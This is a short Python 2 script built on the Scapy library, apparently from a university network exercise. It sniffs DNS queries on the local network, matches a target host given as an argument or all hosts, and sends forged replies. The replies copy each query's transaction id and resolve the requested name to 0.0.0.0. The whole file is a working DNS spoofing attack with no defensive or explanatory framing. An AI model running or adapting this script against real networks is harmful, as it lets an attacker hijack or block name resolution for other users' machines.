from scapy.all import *

class entier:
    def __init__(self):
        self.val = 0
    def inc(self):
        self.val += 1
i = entier()

paquet = sr1(IP(dst='129.104.201.51')/UDP()/DNS(rd=1,qd=DNSQR(qname='radius.polytechnique.fr')))
paquet[IP].src='0.0.0.0'
paquet[IP].dst='0.0.0.0'
paquet[DNS].an[0].rrname='salut.org'
paquet[DNS].an[0].rdata='0.0.0.0'


def maFonction(a):
    i.inc()
    msg = str(i.val) + ': ' + a[IP].src + ' -> ' + a[IP].dst
    if (a[IP].src == filtre) or (a[IP].dst == filtre) or (filtre == '-a'):
        msg = msg + ' <-- REQUEST for ' + a[DNS].qd[0].qname
        print msg
        paquet[IP].src = a[IP].dst
        paquet[IP].dst = a[IP].src
        paquet[DNS].an[0].rrname=a[DNS].qd[0].qname
        paquet[DNS].id=a[DNS].id
        tosend=Ether()/paquet
        sendp(tosend)
        
def monFiltre(x):
    return (x.haslayer(DNS)) and (x[DNS].qr==0L)
    

filtre = sys.argv[1]
sniff(count = 1000,lfilter = monFiltre,prn = maFonction, timeout = 60)